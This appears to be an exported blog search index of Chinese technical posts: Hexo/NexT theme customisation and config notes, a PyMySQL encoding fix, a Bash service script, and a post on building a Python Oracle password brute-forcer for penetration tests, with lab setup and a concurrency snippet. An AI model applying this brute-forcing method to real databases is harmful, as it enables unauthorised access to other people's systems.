background:rgba(241,241,241,0.3);&#125;.highlight, pre &#123; margin: 5px 0; padding: 5px; border-radius: 3px; background:rgba(241,241,241,0.3);&#125;.highlight, td&#123; background:rgba(241,241,241,0.1)&#125;.highlight, gutter pre&#123; background:rgba(241,241,241,0.1)&#125;.highlight, code, pre &#123; border: 1px solid #d6d6d6; background:rgba(241,241,241,0.3)&#125;table&gt;tbody&gt;tr:nth-of-type(odd)&#123; background:rgba(241,241,241,0.1)&#125;注释/hexo/themes/next/source/css/_components/highlight/highlight.styl文件第81、88行：1// background-color: $highlight-gutter.bg-color这一块修改学习到了一个小技巧，通过chrome的F12→Elements→Styles进行一层层修改测试，快速找到需要修改的地方。Ps：这里要谢谢我的同事-C！播放器安装APlayer插件安装Aplayer播放器，在/hexo目录执行npm install aplayer --save。安装完后在node_modules目录下找到APlayer.min.js文件，将其复制到theme/next/source/js/src/目录下。在你想要加入音乐播放器的地方插入以下代码，这里我把它放到了侧边栏。打开theme/next/layout/_custom/文件夹下的sidebar.swig文件，向其中添加以下代码：1234567891011121314151617181920212223242526272829303132333435363738&lt;div id="player1" class="aplayer" data-id="2058781355" data-server="netease" data-type="playlist" data-mode="circulation"&gt;&lt;/div&gt;&lt;script src="/js/src/APlayer.min.js"&gt;&lt;/script&gt;&lt;script type="text/javascript"&gt;var ap = new APlayer(&#123; element: document.getElementById('player1'), // Optional, player element narrow: false, // Optional, narrow style autoplay: true, // Optional, autoplay song(s), not supported by mobile browsers showlrc: 3, // Optional, show lrc, can be 0, 1, 2, see: ###With lrc mutex: true, // Optional, pause other players when this player playing theme: '#e6d0b2', // Optional, theme color, default: #b7daff mode: 'circulation', // Optional, play mode, can be `random` `single` `circulation`(loop) `order`(no loop), default: `circulation` preload: 'metadata', // Optional, the way to load music, can be 'none' 'metadata' 'auto', default: 'auto' listmaxheight: '513px', // Optional, max height of play list music: [ &#123; title: '化身孤岛的鲸', // Required, music title author: '不才', // Required, music author url: '/music/不才 - 化身孤岛的鲸.mp3', // Required, music url pic: '/music/不才 - 化身孤岛的鲸.jpg', // Optional, music picture lrc: '/music/不才 - 化身孤岛的鲸.lrc' // Optional, lrc, see: ###With lrc &#125;, &#123; title: '我的一个道姑朋友', // Required, music title author: '以冬', // Required, music author url: '/music/以冬 - 我的一个道姑朋友.mp3', // Required, music url pic: '/music/以冬 - 我的一个道姑朋友.jpg', // Optional, music picture lrc: '/music/以冬 - 我的一个道姑朋友.lrc' // Optional, lrc, see: ###With lrc &#125;, &#123; title: '七月上', // Required, music title author: 'Jam', // Required, music author url: '/music/Jam - 七月上.mp3', // Required, music url pic: '/music/Jam - 七月上.jpg', // Optional, music picture lrc: '/music/Jam - 七月上.lrc' // Optional, lrc, see: ###With lrc &#125; ]&#125;);&lt;/script&gt;自定义播放器样式包含颜色更改，列表歌曲信息的排版修改。在/hexo/theme/next/source/css/_custom文件夹下打开custom.styl文件，往里面添加以下代码：1234567891011121314151617181920// 播放器设置.aplayer-list&#123; height: 100px !important;&#125;.aplayer-list ol li:hover &#123; /*列表悬停颜色*/ background:rgba(255,255,255,0.3) none repeat scroll !important;&#125;.aplayer-list ol li &#123; /*列表底色*/ background:rgba(250,252,123,0.3);&#125;.aplayer-list-light &#123; /*列表播放歌曲颜色*/ background:rgba(97,217,101,0.3) none repeat scroll !important;&#125;#player1 &#123; /*边框样式*/ border-radius: 6px; div,ol &#123;border-radius: 6px;&#125; &#125;#player1 *&#123;color: #696969;&#125; /*字体颜色*//*列表歌曲信息的排版*/.aplayer-list-index&#123;float:left;&#125;.aplayer-list-title&#123;float:left;&#125;.aplayer-list-author&#123;float:right;&#125;音乐播放控制边栏将APlayer-Controler放入/hexo/themes/next/source/js/src/目录下。在/hexo/themes/next/layout/_custom/文件夹下新建一个myapcontroler.swig的文件。向其中添加以下代码：1234567891011121314151617181920212223242526&lt;script src="/js/src/APlayer-Controler.js"&gt;&lt;/script&gt;&lt;div id="AP-controler"&gt;&lt;/div&gt;&lt;script type="text/javascript"&gt;var myapc=new APlayer_Controler(&#123; APC_dom:$('#AP-controler'), aplayer:ap, //此为绑定的aplayer对象 attach_right:true, position:&#123;top:'300px',bottom:''&#125;, fixed:true, btn_width:100, btn_height:120, img_src:['http://oty1v077k.bkt.clouddn.com/bukagirl.jpg', 'http://oty1v077k.bkt.clouddn.com/jumpgirl.jpg', 'http://oty1v077k.bkt.clouddn.com/pentigirl.jpg', 'http://oty1v077k.bkt.clouddn.com/%E8%90%8C1.gif'], img_style:&#123;repeat:'no-repeat',position:'center',size:'contain'&#125;, ctrls_color:'rgba(173,255,47,0.8)', ctrls_hover_color:'rgba(255,140,0,0.7)', tips_on:true, tips_width:140, tips_height:25, tips_color:'rgba(255,255,255,0.6)', tips_content:&#123;&#125;, timeout:30 &#125;);&lt;/script&gt;在/hexo/themes/next/layout文件夹下打开_layout.swig文件，在前添加以下代码：1&#123;% include '_custom/myapcontroler.swig' %&#125;侧边栏美化在/hexo/themes/next/layout/_macro文件夹下打开sidebar.swig文件，找到以下代码行的位置：1&lt;nav class="site-state motion-element"&gt;在上面添加以下代码：123456789101112&lt;!--my custom code begin--&gt;&lt;script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.0/jquery.min.js"&gt;&lt;/script&gt;&lt;script src="https://cdnjs.cloudflare.com/ajax/libs/velocity/1.5.0/velocity.min.js"&gt;&lt;/script&gt;&lt;script type="text/javascript"&gt; $("#sidebar").hover(function()&#123; $("#mydivshow").velocity('stop').velocity(&#123;opacity: 1&#125;); &#125;,function()&#123; $("#mydivshow").velocity('stop').velocity(&#123;opacity: 0&#125;); &#125;);&lt;/script&gt;&lt;div id="mydivshow" class="mydivshow"&gt;&lt;!--my custom code end--&gt;然后找到代码行：1234&lt;/section&gt;&#123;% if display_toc and toc(page.content).length &gt; 1 %&#125;&lt;!--noindex--&gt;&lt;section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active"&gt;在此的上方添加一个，如下所示：12345678&lt;!--my custom code begin--&gt;&lt;/div&gt;&lt;!--my custom code end--&gt;&lt;/section&gt;&#123;% if display_toc and toc(page.content).length &gt; 1 %&#125;&lt;!--noindex--&gt; &lt;section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active"&gt; &lt;div class="post-toc"&gt;首页隐藏文章修改next主题文件夹下的layout中的index.swig文件，将1post_template.render(post, true)修改成:123&#123;% if post.visible !=='hide' %&#125; &#123;&#123; post_template.render(post, true) &#125;&#125;&#123;% endif %&#125;在Front-matter添加visible字段即可，当visible字段为hide时会在首页隐藏文章。1visible: hide版权透明度在/hexo/themes/next/source/css/_custom文件夹下打开custom.styl文件，往里面添加以下代码:1234// 版权样式设置.post-copyright&#123; background:rgba(241,241,241,0.1)&#125;标签透明度在/hexo/themes/next/source/css/_custom文件夹下打开custom.styl文件，往里面添加以下代码:123456// 标签样式设置.posts-expand .post-tags&#123; a &#123; background:rgba(241,241,241,0.1) &#125;&#125;总结自己搞不定，资料查不出来的情况下，问问其他人有时候会有意想不到的效果；CSS可以通过 !important来设置优先级；nexT的样式建议不去修改源码，通过修改/hexo/themes/next/source/css/_custom/custom.styl文件即可；根据最近的一顿操作，发现了hexo目录结构。特此记录，Ps：不建议修改源码样式，虽然我自己改了很多~~手动捂脸：路径文件名作用/hexo/themes/next/source/css/_customcustom.styl可用于自定义配置样式：.content、.sidebar、.header等/hexo/themes/next/source/css/_common/components/highlighthighlight.styl代码样式设置/hexo/themes/next/layout_layout.swig主布局文件/hexo/themes/next/layoutindex.swig首页布局文件/hexo/themes/next/layout···XX布局文件/hexo/themes/next/layout/partialsfooter.swig页脚布局（不确定）/hexo/themes/next/layout/_customNull存放自定义布局文件/hexo/themes/next/layout/_macroAll存放宏，用于博客生成结语这次美化没有完全彻底，可以看到还有一部分样式怪怪的。以后有时间，慢慢优化！！CSS太难了！！！太晚了，洗洗睡咯。]]></content>
      <tags>
        <tag>博客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Blog更新&配置文件详解]]></title>
    <url>%2Farchives%2Fd6a90b9.html</url>
    <content type="text"><![CDATA[最近博客的CSS被我玩坏了，顺带就对博客进行整体更新，并且对hexo、nexT的配置文件进行详细的记录。Ps：每篇文章还弄了摘要格式！好累~~下一篇会写nexT主题的自定义优化。由于使用hexo-neat插件压缩有问题，然后改用gulp进行压缩。发现来来回回都会有问题，并且提交到GitHub上之后，导致博客的CSS都出问题无法显示。发现nexT主题更新到6.0+，在GitHub上面的路径也换了，最终决定重新搭建博客。准备软件、环境这些可以参考博客搭建这篇文章搭建博客。使用hexo init本地新建一个博客之后，下载最新的next主题。12$ cd hexo$ git clone https://github.com/theme-next/hexo-theme-next themes/next配置以前写的文章对Hexo、nexT的配置文件没有进行详细的说明，这次搭建的时候发现有点头痛！因此，这次准备把所用到的各个字段都进行记录，便于以后出现意外情况再次重建。Hexo配置Hexo的配置为hexo根目录下的_config.yml文件。Site配置用于配置站点的主要属性。1234567# Sitetitle: #站点主标题subtitle: #站点副标题description: #站点描述author: #站点作者language: #站点语言timezone: #站点时区Url配置用于配置Url请求时的主要属性。Url这块我进行了优化，安装了hexo-abbrlink插件：让文章链接唯一化。在hexo根目录下执行$ npm install hexo-abbrlink --save123456789101112131415161718# URL## If your site is put in a subdirectory, set url as 'http://yoursite.com/child' and root as '/child/'url: #站点urlenforce_ssl: #强制使用sslroot: #站点目录permalink: archives/:abbrlink.html #站点链接设置abbrlink: #abbrlink设置 alg: crc32 # 算法：crc16(default) and crc32 rep: hex # 进制：dec(default) and hex ## crc16 &amp; hex ## https://iassas.com/posts/66c8.html ## crc16 &amp; dec ## https://iassas.com/posts/65535.html ## crc32 &amp; hex ## https://iassas.com/posts/8ddf18fb.html ## crc32 &amp; dec ## https://iassas.com/posts/1690090958.htmlpermalink_defaults:Directory配置用于配置站点目录的主要属性。该部分的配置不需要修改。123456789# Directorysource_dir: source #资源文件夹，这个文件夹用来存放内容public_dir: public #公共文件夹，这个文件夹用于存放生成的站点文件tag_dir: tags #标签文件夹archive_dir: archives #归档文件夹category_dir: categories #分类文件夹code_dir: downloads/code #Include code 文件夹i18n_dir: :lang #国际化（i18n）文件夹skip_render: #跳过指定文件的渲染，您可使用 glob 表达式来匹配路径Writing配置用于配置写作时的主要属性。该部分的配置不需要修改。123456789101112131415# Writingnew_post_name: :title.md #新文章的文件名称default_layout: post #预设布局titlecase: false #把标题转换为 title caseexternal_link: true #在新标签中打开链接filename_case: 0 #把文件名称转换为 (1) 小写或 (2) 大写render_drafts: false #显示草稿post_asset_folder: false #启动 Asset 文件夹relative_link: false #把链接改为与根目录的相对位址future: true #显示未来的文章highlight: #代码块的设置 enable: true line_number: true auto_detect: true tab_replace:Home page配置用于配置主页的主要属性。12345678910111213141516# Home page setting# path: Root path for your blogs index page. (default = '')# per_page: Posts displayed per page. (0 = disable pagination)# order_by: Posts order. (Order by date descending by default)index_generator: #主页索引 path: '' per_page: 5 order_by: -datearchive_generator: #档案索引 per_page: 20 yearly: true monthly: truetag_generator: #标签索引 per_page: 10Category &amp; Tag配置用于配置分类、标签的主要属性。1234# Category &amp; Tagdefault_category: uncategorized #默认分类category_map: #分类别名tag_map: #标签别名Date配置用于配置日期的主要属性。该部分的配置不需要修改。123456# Date / Time format## Hexo uses Moment.js to parse and display date## You can customize the date format as defined in## http://momentjs.com/docs/#/displaying/format/date_format: YYYY-MM-DD #日期格式time_format: HH:mm:ss #时间格式Pagination配置用于配置分页的主要属性。1234# Pagination## Set per_page to 0 to disable paginationper_page: 10 #每页显示的文章量 (0 = 关闭分页功能)pagination_dir: page #分页目录Extensions配置用于扩展的主要属性。plugin我加了hexo-generator-feed（用来生成RSS），theme我选择用next。123456# Extensions## Plugins: https://hexo.io/plugins/## Themes: https://hexo.io/themes/plugin: - hexo-generator-feedtheme: nextDeployment配置用于配置部署的主要属性。我就选择部署到GitHub，还支持Heroku、Rsync、OpenShift、FTPSync等。可以参考官网说明。部署到GitHub需要安装hexo-deployer-git插件，在hexo根目录下执行$ npm install hexo-deployer-git --save。123456# Deployment## Docs: https://hexo.io/docs/deployment.htmldeploy: type: git repo: https://github.com/youname/youname.github.io.git branch: mastersearch配置用于配置搜索的主要属性。启用搜索需要安装hexo-generator-search、hexo-generator-searchdb插件，在hexo根目录下执行12$ npm install hexo-generator-search --save$ npm install hexo-generator-searchdb --save安装完之后还需要在nexT主题里面进行配置。后续会说到如何配置，稳住。12345search: path: search.xml field: post format: html limit: 10000feed配置用于配置RSS。RSS和ATOM的区别，可以参考这里。123456feed: type: atom #atom/rss2 path: atom.xml #feed路径 limit: 10 #最大帖子数 hub: content: #true/false 是否将整个页面包含进去hexo-neat配置用于博客压缩，加快访问速度。启用压缩需要安装hexo-neat，在hexo根目录下执行$ npm install hexo-neat --save12345678910111213141516# hexo-neat 静态资源压缩neat_enable: true neat_html: enable: true exclude: neat_css: enable: false exclude: - '*.min.css'neat_js: enable: true mangle: true output: compress: exclude: - '*.min.js'hexo-encypt配置用于文章加密。启用文章加密需要安装hexo-blog-encrypt，在hexo根目录下执行$ npm install hexo-blog-encrypt --save123# 文章加密功能encrypt: enable: true启用加密功能需要在文章的Front-matter部分添加password字段即可。建议修改post.md模版，目录为hexo\scaffolds\。123456789---title: &#123;&#123; title &#125;&#125;date: &#123;&#123; date &#125;&#125;tags: categories: password: #文章密码abstract: #文章摘要message: #密码提示---hexo-autonofollowp配置用于外部链接优化，主要作用：防止不可信的内容，最常见的是博客上的垃圾留言与评论中为了获取外链的垃圾链接，为了防止页面指向一些拉圾页面和站点。付费链接：为了防止付费链接影响Google的搜索结果排名，Google建议使用nofollow属性。引导爬虫抓取有效的页面：避免爬虫抓取一些无意义的页面，影响爬虫抓取的效率。其主要方法是给所有外部链接加上rel=”external nofollow”属性，对外部链接target=”_blank”采用在新窗口种打开外部链接的方法。启用该功能需要安装hexo-autonofollowp，在hexo根目录下执行$ npm install hexo-autonofollowp --save12345# 外部链接优化nofollow: enable: true exclude: # 例外的链接，可将友情链接放置此处 - 'yousite'sitemap配置用于站点地图配置，主要用于SEO优化。启用该功能需要安装hexo-generator-sitemap、hexo-generator-baidu-sitemap，在hexo根目录下执行12$ npm install hexo-generator-sitemap --save$ npm install hexo-generator-baidu-sitemap --save配置如下12345# hexo sitemapsitemap: path: sitemap.xmlbaidusitemap: path: baidusitemap.xmlsymblos_count_time配置用于站点字数、阅读时间统计等。启用该功能需要安装hexo-symbols-count-time，在hexo根目录和next主题目录下执行$ npm install hexo-symbols-count-time --save。注意这里我是两个地方都执行。12345symbols_count_time: symbols: true time: true total_symbols: true total_time: truelive2d配置用于站点’吉祥物’设置，作用应该是美化站点吧。手动/斜眼笑！想要吉祥物的话需要先安装hexo-helper-live2d，在hexo根目录下执行$ npm install hexo-helper-live2d --save。接下来修改next主题目录的_layout.swig文件，路径为hexo\themes\next\layout\。在合适的地方给它安个家，要在body标签之间，例如1&lt;body&gt;&#123;&#123; live2d() &#125;&#125;&lt;/body&gt;也可以看看喜欢什么吉祥物。12345live2d: model: z16 bottom: -30 mobileShow: true mobileScaling: 0.5lazyload配置用于图片快速加载设置。启用该功能需要安装hexo-lazyload-image，在hexo根目录在执行$ npm install hexo-lazyload-image --save1234lazyload: enable: true onlypost: false loadingImg: # eg. ./images/loading.pngnexT配置nexT的配置文件为next目录下的_config.yml文件，路径为hexo\themes\next_config.yml。由于nexT的配置较多，就记录修改或者启用的地方。配置文件中所填写的目录路径皆为/source目录下，例如修改图标来源将参数值设置成/images/favicon.ico的话，表示来源为hexo\themes\next\source\images\favicon.ico。favicon设置用于图标设置，效果显示在站点标签页的地方。1234567favicon: small: /images/favicon-16x16-next.ico medium: /images/favicon-32x32-next.ico apple_touch_icon: /images/apple-touch-icon-next.png #safari_pinned_tab: /images/logo.svg #android_manifest: /images/manifest.json #ms_browserconfig: /images/browserconfig.xmlkeyword设置用于关键字设置。1keywords: "keyword1, keyword2, keyword3"rss设置用于rss设置，结合hexo中的设置。1rss: /atom.xmlfooter设置用于页脚设置，nexT6.0可以在配置文件中设置页脚。以前用5.X的时候，需要自己手工去修改。所以及时更新很重要哦。12345678910111213141516171819202122footer: # Specify the date when the site was setup. # If not defined, current year will be used. since: #网站建立日期 # Icon between year and copyright info. icon: heart #年份和版权之间的图标 # If not defined, will be used `author` from Hexo main config. copyright: Hywell #版权 # ------------------------------------------------------------- # Hexo link (Powered by Hexo). powered: false theme: # Theme &amp; scheme info link (Theme - NexT.scheme). enable: false # Version info of NexT after scheme info (vX.X.X). version: false # ------------------------------------------------------------- # Any custom text can be defined here. custom_text: #输入自定义文本SEO设置用于seo优化设置。123canonical: trueseo: trueindex_with_subtitle: trueMenu设置用于导航栏设置。这里的顺序会影响导航栏上显示布局的顺序。12345678910menu: home: / || home categories: /categories/ || th archives: /archives/ || archive tags: /tags/ || tags about: /about/ || usermenu_settings: icons: true badges: false #设置为true会显示具体的数值Schemes设置用于样式设置。我采用了Mist样式。1scheme: MistSidebar设置用于侧边栏设置。12345678910111213141516171819202122232425262728293031323334site_state: true #显示文章、分类、标签social: #友情链接设置 Key: permalink || icon GitHub: https://github.com/hywell || githubsocial_icons: #社交图标 enable: true icons_only: false transition: truegithub_banner: https://github.com/hywell || Follow me on GitHub # 用于设置右上角GitHub横幅。# 友情链接设置links_icon: linklinks_title: 友情链接links_layout: block#links_layout: inlinelinks: keyword: link# 侧边栏头像设置avatar: /images/avatar.png# 侧边栏目录显示toc: enable: true number: true wrap: true# 侧边栏设置sidebar: position: left #位置 display: post #显示设置 scrollpercent: true #滚动百分比 onmobile: true #窄视图启用侧边栏POST设置用于发布设置。12345678910111213141516171819202122232425262728293031323334353637scroll_to_more: true #如果文章有摘要（&lt;!-- more --&gt;），会自动滚动到摘要下面。save_scroll: true #通过cookies来缓存阅读进度excerpt_description: true #自动摘录描述作为序言auto_excerpt: #自动摘录，如果不设置&lt;!-- more --&gt;的话，可以用这个来控制 enable: true length: 150post_meta: #发布元设置 item_text: true created_at: true updated_at: true categories: truesymbols_count_time: #字数与阅读时间统计设置 需安装hexo-symbols-count-time separated_meta: true item_text_post: true item_text_total: true awl: 25 wpm: 50# Wechat Subscriber #微信二维码设置wechat_subscriber: enabled: true qcode: /images/Wechat.jpg description: 描述文字# Reward #打赏设置reward_comment: 打赏commentwechatpay: /images/wechatpay.jpgalipay: /images/alipay.jpg#bitcoin: /images/bitcoin.png# Declare license on posts #文章license设置post_copyright: enable: true license: CC BY-NC-SA 3.0 license_url: https://creativecommons.org/licenses/by-nc-sa/3.0/Code Highlight theme设置用于代码主题设置。1highlight_theme: normalneedmoreshare2设置用于分享设置。12345678910111213141516needmoreshare2: enable: true postbottom: #文章分享 enable: true options: iconStyle: box boxForm: horizontal position: bottomCenter networks: Weibo,Wechat,Douban,QQZone,Twitter,Facebook,Evernote float: #浮动分享 enable: false options: iconStyle: box boxForm: horizontal position: middleRight networks: Weibo,Wechat,Douban,QQZone,Twitter,FacebookLocal search设置用于本地搜索，需要安装hexo-generator-searchdb。1234567local_search: enable: true # if auto, trigger search by changing input # if manual, trigger search by pressing enter key or search button trigger: auto # show top n results per article, show all results by setting to -1 top_n_per_article: 1Reading progress bar设置用于阅读进度设置，在top显示，需要扩展theme-next-reading-progress。1234reading_progress: enable: true color: "#37c6c0" height: 2pxpace设置用于页面加载进度设置，我选用了pace-theme-loading-bar，需要扩展theme-next-pace。推荐几个我个人感觉不错的：pace-theme-center-atompace-theme-center-circlepace-theme-center-simplepace-theme-loading-bar12pace: truepace_theme: pace-theme-loading-barCanvas-nest设置用于网页背景效果设置。1canvas_nest: trueGitment设置用于页面评论系统设置，本来选用Hypercomments，在样式上设置不好看。因此，换成了Gitment。需要扩展Gitmentnpm i --save gitment。12345678910111213gitment: enable: true mint: true # RECOMMEND, A mint on Gitment, to support count, language and proxy_gateway count: true # Show comments count in post meta area lazy: true # Comments lazy loading with a button cleanly: false # Hide 'Powered by ...' on footer, and more language: # Force language, or auto switch by theme github_user: user # MUST HAVE, Your Github Username github_repo: user.github.io # MUST HAVE, The name of the repo you use to store Gitment comments client_id: # MUST HAVE, Github client id for the Gitment client_secret: # EITHER this or proxy_gateway, Github access secret token for the Gitment proxy_gateway: # Address of api proxy, See: https://github.com/aimingoo/intersect redirect_protocol: # Protocol of redirect_uri with force_redirect_protocol when mint enabled总结两个配置文件弄得我满脸懵逼！！太难了~~配置文件字段名和字段值中间需要空格;部分插件安装、配置Hexo、nexT都需进行；文章中存在特殊符号，需要使用三个单引号以代码形式，不然会报错；所有配置文件icon都可以在fontawesome选择心仪的，替换即可；]]></content>
      <categories>
        <category>Blog</category>
      </categories>
      <tags>
        <tag>博客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python-Pymysql中文写入]]></title>
    <url>%2Farchives%2F40673788.html</url>
    <content type="text"><![CDATA[python27的编码是一大难点，然而这次的难点并不是在于python，而在于数据库。前言最近在使用Pymysql向mysql数据库写入中文时，发现出现Warning:(1366, u”Incorrect string value: ‘\x······”)数据库里面的结果为乱码解决思路看到中文乱码，马上就想到编码问题。该问题共涉及到三处编码（有可能还多，想不出来了）：数据库编码、数据来源编码、脚本连接编码。由于数据来源编码能肯定为Unicode，因此需要从脚本连接编码、数据库编码去解决。解决历程脚本连接编码由于pymysql支持charset字段，下意识想到通过charset参数进行设置。123456789101112import pymysql.cursors config = &#123; 'host':'127.0.0.1', 'port':3306, 'user':'root', 'password':'', 'db':'test', 'charset':'utf8mb4', 'cursorclass':pymysql.cursors.DictCursor, &#125;connection = pymysql.connect(**config)然后重新运行脚本，发现并没有解决。数据库编码查看数据库编码，发现数据库默认编码为latin1。1show variables like "char%";找到问题所在就方便了！修改database编码即可。由于我使用的是debian，需要修改/etc/mysql/my.cnf文件。1vim /etc/mysql/my.cnf在[mysqld]字段下面添加character-set-server=utf8，保存并重启mysql服务即可。重新查询数据库编码。美滋滋的运行代码，发现还是Warning！！！最终解决在修改了数据库编码以为脚本可以成功运行的时候，现实跟我说too young！后面兜兜转转，发现重新建立数据库即可！总结Python27遇到中文的时候，需要特别注意编码；Python进行数据交互的时候，每个地方的编码都需要注意；配置修改之后，一定要刷新或者新建！！！]]></content>
      <categories>
        <category>Code</category>
        <category>Python27</category>
      </categories>
      <tags>
        <tag>Code</tag>
        <tag>Python</tag>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux-Bash(一)]]></title>
    <url>%2Farchives%2F33a6bcb.html</url>
    <content type="text"><![CDATA[我回来了，这次接触的是Linux下的shell脚本。前言最近常常在Linux下启动一堆服务，每次重启电脑就得敲一堆命令，让我这个懒癌患者深受困扰！！基于不想把它们加入开机自启的前提，就开始动手写个Bash脚本将它们一键全部启动。Bash解释器shell脚本首行需要有一个固定的格式，其意义表明使用对应解释器解析该脚本，常常有/bin/bash，/bin/sh等，这里我用的是bash:1#!/bin/bash常用语法变量声明：name=变量调用：$name命令行参数获取：12345$0 # 命令行第一个变量 往往为脚本名称$1 # 命令行第二个变量$2 # 命令行第三个变量$3 # 命令行第四个变量$init # 命令行第init变量多分支判断：12345678case str in mode) command ;; mode) command ;;esac编写思路首先定义各个服务的工作目录设置成对应变量，使用分支判断调用不同功能：启动服务、杀死服务进程、修改服务配置等。脚本编写根据编写思路，需要使用到的命令大致分为：启动、杀进程（kill）、修改（seq）等。启动在不同的环境变量下，启动服务的命令不同。在这里我拿启动python为例。12345678#!/bin/bashpython=/usr/bin/pythoncase $1 in start) $python ;;esac使用./shell.sh start来启动python杀进程Linux下使用kill命令即可杀进程，在这里我拿杀死启动的python为例。123456789#!/bin/bashpython=/usr/bin/pythoncase $1 in kill) pid_python=`ps -ef|grep $python|grep -v "$0"|grep -v "grep"|awk '&#123;print $2&#125;'` kill -9 $pid_python ;;esac使用./shell.sh kill来杀死python修改需要对服务配置文件进行修改的时候，使用Linux的seq命令可以完成。12345678#!/bin/bashconfig=/opt/config.cnfcase $1 in config) sed -i 's/port=.*/port=80/g' $config ;esac使用./shell.sh config来修改config.cnf文件总结在编写bash脚本的时候，大部分问题都是由格式、编码等引起。在Windows下编写，在Linux下使用，大概率会由换行符导致脚本无法运行：Windows下换行符为CRLF（正则表达式的\r\n，ASCII码的13和10），Unix（or Linux）下换行符为LF（正则表达式的\n）。这个问题会导致在Linux下运行\r\n为无效参数、vi等编辑器打开会出现^M、脚本头部出现乱码字符等;Linux Shell脚本单引号、双引号在使用时，具有不同效果：单引号为所见即所得、双引号为解析之后所得;seq命令在替换特殊字符时可以用\来转义（正则转义）。完整代码由于这个脚本涉及到一些机密的东西，完整代码不能上传到GitHub。望理解！]]></content>
      <categories>
        <category>Code</category>
        <category>Bash</category>
      </categories>
      <tags>
        <tag>Code</tag>
        <tag>Linux</tag>
        <tag>Bash</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python-Oracle爆破]]></title>
    <url>%2Farchives%2F209eed3d.html</url>
    <content type="text"><![CDATA[做渗透的时候遇到Oracle端口对外开放，用python编写脚本去自动爆破，爆破成功就是拿下数据库。环境搭建Oracle安装去Oracle官网下载Oracle Database 11g，下载地址。我这边下载Windows版本进行安装，两个文件都要下载，下载完成之后全部选中解压。解压之后，运行setup.exe。取消【我希望通过My Oracle Support接受安全更新】勾选，点下一步。会跳出一个提示，直接点击【是】即可。选择【创建和配置数据库】。由于我们用来做测试，所以选择【桌面类】即可。接下来对数据库进行配置，我这边将全局数据库名设置为Brute，管理口令设置成BruteTest，别的保持默认即可。如果管理口令不符合Oracle建议的标准，会有一个提示，直接点击【是】即可。接下来程序就会进行检查，待检查完成会出现一个概要。点击完成，开始安装。安装完成之后，点击【口令管理】对用户口令进行修改。对sys、system两个用户设置新口令。如果口令不满足复杂性策略，会有一个提示，直接点击【是】即可。最后Oracle数据库安装成功。Oracle配置安装完成之后，在所有程序菜单中找到Oracle，打开【Database Control - Brute】。使用sys用户、SYSDBA身份登录。表空间点击【服务器】→【表空间】。点击【创建】。输入名称，点击【添加】。输入文件名，点击【继续】。点击【确定】，建立表空间。用户点击【服务器】→【用户】。点击【创建】。输入名称、口令，点击【确定】。由于只是用于爆破，所以这里就不设置【角色】、【权限】等。端口对外开放对listener.ora、tnsnames.ora文件进行修改，文件路径类似：\app\Administrator\product\11.2.0\dbhome_2\NETWORK\ADMIN\，根据安装时所选的目录自行寻找。将两个文件里的localhost修改成计算机名。重启【OracleDBConsoleBrute】、【OracleOraDb11g_home1TNSListener】服务。可以使用其他电脑成功连接。脚本编写Python27有一个库支持对Oracle进行操作，cx_Oracle，使用pip安装即可。1pip install cx_Oracle安装好之后，需要安装Oracle的client，不同系统安装的方式也不同，具体可以参考官方文档。client安装完成之后，使用cx_Oracle尝试连接。信息错误情况的各种错误信息。终端输出爆破时，信息有很多。如果不对样式进行设置，导致不能快速找到有效信息。因此，需要对终端输出设置样式。有一个外部库colorama支持输出时的样式设置，通过pip安装即可.1pip install colorama安装完成之后，需要先调用init进行初始化。12345678910111213# --coding=utf-8--## 参照表## Fore: BLACK, RED, GREEN, YELLOW, BLUE, MAGENTA, CYAN, WHITE, RESET.## Back: BLACK, RED, GREEN, YELLOW, BLUE, MAGENTA, CYAN, WHITE, RESET.## Style: DIM, NORMAL, BRIGHT, RESET_ALLfrom colorama import init, Fore, Style, Backinit(autoreset=True)print Fore.GREEN + u'字体颜色设置'print Style.DIM + u'字体样式设置'print Back.GREEN + u'背景颜色设置'异步设置使用gevent进行爆破，当爆破量很大的时候，会导致内存飙高。因此，设置了阀值。1234567891011while True: if not blasting.empty(): if len(self.threads) &lt; 5000: self.threads.append(gevent.spawn(self._test, blasting.get())) else: gevent.joinall(self.threads) self.threads = [] else: if len(self.threads) &gt; 0: gevent.joinall(self.threads) break总结在编写Oracle爆破脚本的时候，大部分的问题由环境搭建、配置引起。Oracle安装完成之后，数据库是不对外开放需要修改配置文件，配置文件localhost修改成计算机名，当服务器IP修改时，其他计算机还是可以连接。修改成ip时，服务器IP修改时，需要修改配置文件中的ip；Oracle端口不对外开放，确认配置文件修改正确的情况下，【OracleDBConsoleBrute】、【OracleOraDb11g_home1TNSListener】服务需要重启，网上说只需要重启TNS服务即可，但是测试时，发现两个服务都需要重启；Python终端彩字输出可以使用\033[显示方式;前景色;背景色m + 结尾部分：\033[0m，但Windows下失败，Linux下没去尝试；使用colorama需要先初始化init(autoreset=True)。完整代码完整代码已经上传到我的GiHub。如果有兴趣，不妨移步到Github上一观！Code。]]></content>
      <categories>
        <category>Code</category>
        <category>Python27</category>
      </categories>
      <tags>
        <tag>Code</tag>
        <tag>Python27</tag>
        <tag>Oracle</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安全-内网渗透测试（无DHCP）]]></title>
    <url>%2Farchives%2F27b0f6e3.html</url>
